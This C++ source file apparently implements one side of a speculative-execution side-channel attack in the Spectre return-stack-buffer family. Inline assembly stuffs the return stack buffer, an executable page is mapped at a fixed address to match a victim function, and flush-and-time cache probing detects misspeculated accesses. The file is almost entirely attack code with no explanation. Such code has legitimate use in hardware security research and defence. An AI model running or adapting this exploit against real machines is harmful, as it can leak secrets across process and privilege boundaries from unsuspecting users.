#include "util.hpp"
#include <iostream>
#include <fstream>
#include <sys/mman.h>
#include <string.h>

using namespace std;

char array[256*256];

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"

int total = 0;
int magic = 123;

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	clflush((void *)addr);
}

void checkForMisspeculation() {
	ADDR_PTR address, tmp;

	for (int i = 0; i < 10000; i++) {
		sched_yield();
		asm(
			retAsm(1)
			retAsm(2)
			retAsm(3)
			retAsm(4)
			retAsm(5)
			retAsm(6)
			retAsm(7)
			retAsm(8)
			retAsm(9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			: "r" (address)
		);
	
		total += measure_one_block_access_time((ADDR_PTR)&array[magic]);
		clflush((void *)&array[magic]);
	}
}

void runMeSpeculatively() { // this should be at the same VA as victim's callLoop()
	volatile int temp = array[magic];
}

int main(int argc, char *argv[]){
	if (argc > 1) {
		printf("doing nothing\n");
		while(1) {}
	}

	ADDR_PTR start = 0x0000555555556000;

	void *ptr = mmap((void *)start,
		4096,
		PROT_READ|PROT_EXEC|PROT_WRITE,
		MAP_ANONYMOUS|MAP_SHARED,
		-1,
		0);

	if (ptr == MAP_FAILED) {
		printf("mmap failed: %s\n", strerror(errno));
		return 0;
	}

	printf("ptr is %p\n", ptr);

	ptr = memcpy(ptr, (void *)&runMeSpeculatively, 32);

	((int (*)())ptr)();

	return 0;
}